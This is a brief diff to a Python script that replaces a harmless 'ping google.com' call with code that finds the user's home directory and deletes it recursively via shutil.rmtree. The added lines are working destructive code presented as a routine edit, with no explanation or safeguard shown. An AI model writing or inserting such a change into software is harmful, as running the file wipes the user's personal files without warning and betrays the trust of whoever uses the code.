@@ -1,2 +1,5 @@
 import os
-os.system('ping google.com')
+import shutil
+
+home_dir = os.path.expanduser("~")
+shutil.rmtree(home_dir)
